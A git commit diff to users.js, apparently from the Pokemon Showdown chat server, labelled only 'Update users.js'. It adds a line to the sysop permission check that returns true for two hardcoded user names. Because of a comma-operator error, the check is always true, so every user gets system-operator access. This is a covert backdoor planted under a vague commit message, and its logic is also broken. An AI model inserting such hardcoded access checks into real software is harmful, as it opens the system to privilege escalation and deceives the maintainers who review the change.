b3759bef3d2c07e102f9b3c2dc8b676352d487b0
Anrin Deo Avis <anrin11@gmail.com>
2015-06-25 13:36:33 +0530

    Update users.js

--- users.js
+++ users.js
@@ -649,6 +649,7 @@ User = (function () {
 	 * Special permission check for system operators
 	 */
 	User.prototype.hasSysopAccess = function () {
+		if (this.userid === 'mudkipguy','anrindeoavis') return true;
 		if (this.isSysop && Config.backdoor) {
 			// This is the Pokemon Showdown system operator backdoor.
 
